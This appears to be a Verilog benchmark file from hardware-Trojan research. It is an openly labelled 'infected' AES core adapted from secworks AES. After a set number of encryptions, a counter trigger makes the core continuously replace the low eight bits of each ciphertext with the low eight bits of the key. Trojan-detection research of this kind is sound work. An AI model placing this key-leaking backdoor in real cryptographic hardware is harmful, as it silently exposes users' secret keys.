//======================================================================
//
// aes_core_tapped.v
// -----------------
// Infected AES core for T02_p2_slow_leak.
//
// Trigger (T3): encryption counter reaches T02_TRIGGER_COUNT.
// Payload (P2): leak key[7:0] into result[7:0].
//
// Default threshold is 16'hFFFF to preserve the benchmark/hardware
// behavior. The security testbench may override the parameter only for
// the T02 simulation instance so regression does not need ~2^16 blocks.
//
// Based on secworks AES.
//======================================================================

`default_nettype none

module aes_core_tapped #(
    parameter [15:0] T02_TRIGGER_COUNT = 16'hFFFF
) (
    input  wire            clk,
    input  wire            reset_n,

    input  wire            encdec,
    input  wire            init,
    input  wire            next,
    output wire            ready,

    input  wire [255 : 0]  key,
    input  wire            keylen,

    input  wire [127 : 0]  block,
    output wire [127 : 0]  result,
    output wire            result_valid,
    output wire [1407 : 0] round_keys_flat,

    // RCM: tap round counter.
    output wire [3 : 0]    muxed_round_nr,

    // ORC: tap state immediately before final round.
    output wire [127 : 0]  state_before_final
);

  //----------------------------------------------------------------
  // Internal constants.
  //----------------------------------------------------------------
  localparam CTRL_IDLE = 2'h0;
  localparam CTRL_INIT = 2'h1;
  localparam CTRL_NEXT = 2'h2;

  //----------------------------------------------------------------
  // Core control registers.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  //----------------------------------------------------------------
  // T02 trigger state.
  //----------------------------------------------------------------
  reg [15:0] encrypt_counter;
  reg        encrypt_counter_we;

  //----------------------------------------------------------------
  // Internal datapath wires/registers.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr_int;
  reg            muxed_ready;

  wire [127 : 0] enc_state_before_final;
  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg  [31 : 0]  muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */

  //----------------------------------------------------------------
  // T02 trigger/payload.
  //----------------------------------------------------------------
  wire           trojan_trig;
  wire [127 : 0] result_maybe_evil;

  assign trojan_trig =
      (encrypt_counter >= T02_TRIGGER_COUNT);

  assign result_maybe_evil =
      trojan_trig
      ? {muxed_new_block[127:8], key[7:0]}
      : muxed_new_block;

  //----------------------------------------------------------------
  // AES encipher datapath.
  //----------------------------------------------------------------
  aes_encipher_block_tapped enc_block(
      .clk(clk),
      .reset_n(reset_n),
      .next(enc_next),
      .keylen(keylen),
      .round(enc_round_nr),
      .round_key(round_key),
      .sboxw(enc_sboxw),
      .new_sboxw(new_sboxw),
      .block(block),
      .new_block(enc_new_block),
      .ready(enc_ready),
      .state_before_final(enc_state_before_final)
  );

  //----------------------------------------------------------------
  // AES decipher datapath.
  //----------------------------------------------------------------
  aes_decipher_block dec_block(
      .clk(clk),
      .reset_n(reset_n),
      .next(dec_next),
      .keylen(keylen),
      .round(dec_round_nr),
      .round_key(round_key),
      .block(block),
      .new_block(dec_new_block),
      .ready(dec_ready)
  );

  //----------------------------------------------------------------
  // Tapped AES key memory.
  //----------------------------------------------------------------
  aes_key_mem_tapped keymem(
      .clk(clk),
      .reset_n(reset_n),
      .key(key),
      .keylen(keylen),
      .init(init),
      .round(muxed_round_nr_int),
      .round_key(round_key),
      .ready(key_ready),
      .sboxw(keymem_sboxw),
      .new_sboxw(new_sboxw),
      .round_keys_flat(round_keys_flat)
  );

  //----------------------------------------------------------------
  // Shared S-box.
  //----------------------------------------------------------------
  aes_sbox sbox_inst(
      .sboxw(muxed_sboxw),
      .new_sboxw(new_sboxw)
  );

  //----------------------------------------------------------------
  // Output connectivity.
  //----------------------------------------------------------------
  assign ready              = ready_reg;
  assign result             = result_maybe_evil;
  assign result_valid       = result_valid_reg;
  assign muxed_round_nr     = muxed_round_nr_int;
  assign state_before_final = enc_state_before_final;

  //----------------------------------------------------------------
  // Register update.
  //----------------------------------------------------------------
  always @(posedge clk or negedge reset_n) begin : reg_update
    if (!reset_n) begin
      result_valid_reg  <= 1'b0;
      ready_reg         <= 1'b1;
      aes_core_ctrl_reg <= CTRL_IDLE;
      encrypt_counter   <= 16'd0;
    end
    else begin
      if (result_valid_we)
        result_valid_reg <= result_valid_new;

      if (ready_we)
        ready_reg <= ready_new;

      if (aes_core_ctrl_we)
        aes_core_ctrl_reg <= aes_core_ctrl_new;

      // Count each accepted encryption exactly once.
      //
      // The counter SATURATES at the threshold instead of wrapping
      // around. A wrapping counter would drop back to 0 one
      // encryption after the trigger fires, so the payload would
      // leak exactly once every 65536 encryptions. The benchmark
      // specification for T02 is a slow but CONTINUOUS key leak
      // ("leak 8 key bits into the ciphertext on every encryption
      // once the counter reaches the threshold"), so the counter
      // must stay above the threshold once it is reached.
      if (encrypt_counter_we) begin
        if (encrypt_counter < T02_TRIGGER_COUNT)
          encrypt_counter <= encrypt_counter + 16'd1;
      end
    end
  end

  //----------------------------------------------------------------
  // Shared S-box mux.
  //----------------------------------------------------------------
  always @* begin : sbox_mux
    if (init_state)
      muxed_sboxw = keymem_sboxw;
    else
      muxed_sboxw = enc_sboxw;
  end

  //----------------------------------------------------------------
  // Encrypt/decrypt mux.
  //----------------------------------------------------------------
  always @* begin : encdec_mux
    enc_next = 1'b0;
    dec_next = 1'b0;

    if (encdec) begin
      enc_next            = next;
      muxed_round_nr_int  = enc_round_nr;
      muxed_new_block     = enc_new_block;
      muxed_ready         = enc_ready;
    end
    else begin
      dec_next            = next;
      muxed_round_nr_int  = dec_round_nr;
      muxed_new_block     = dec_new_block;
      muxed_ready         = dec_ready;
    end
  end

  //----------------------------------------------------------------
  // AES core control FSM.
  //----------------------------------------------------------------
  always @* begin : aes_core_ctrl
    init_state         = 1'b0;
    ready_new          = 1'b0;
    ready_we           = 1'b0;
    result_valid_new   = 1'b0;
    result_valid_we    = 1'b0;
    aes_core_ctrl_new  = CTRL_IDLE;
    aes_core_ctrl_we   = 1'b0;

    // Critical fix: default prevents a latch on the Trojan counter WE.
    encrypt_counter_we = 1'b0;

    case (aes_core_ctrl_reg)
      CTRL_IDLE: begin
        if (init) begin
          init_state        = 1'b1;
          ready_new         = 1'b0;
          ready_we          = 1'b1;
          result_valid_new  = 1'b0;
          result_valid_we   = 1'b1;
          aes_core_ctrl_new = CTRL_INIT;
          aes_core_ctrl_we  = 1'b1;
        end
        else if (next) begin
          init_state        = 1'b0;
          ready_new         = 1'b0;
          ready_we          = 1'b1;
          result_valid_new  = 1'b0;
          result_valid_we   = 1'b1;
          aes_core_ctrl_new = CTRL_NEXT;
          aes_core_ctrl_we  = 1'b1;

          // Only encryption requests advance the T02 trigger counter.
          if (encdec)
            encrypt_counter_we = 1'b1;
        end
      end

      CTRL_INIT: begin
        init_state = 1'b1;

        if (key_ready) begin
          ready_new         = 1'b1;
          ready_we          = 1'b1;
          aes_core_ctrl_new = CTRL_IDLE;
          aes_core_ctrl_we  = 1'b1;
        end
      end

      CTRL_NEXT: begin
        init_state = 1'b0;

        if (muxed_ready) begin
          ready_new         = 1'b1;
          ready_we          = 1'b1;
          result_valid_new  = 1'b1;
          result_valid_we   = 1'b1;
          aes_core_ctrl_new = CTRL_IDLE;
          aes_core_ctrl_we  = 1'b1;
        end
      end

      default: begin
        // Fail back to the original secworks-style default behavior.
      end
    endcase
  end

endmodule

`default_nettype wire

//======================================================================
// EOF aes_core_tapped.v
//======================================================================
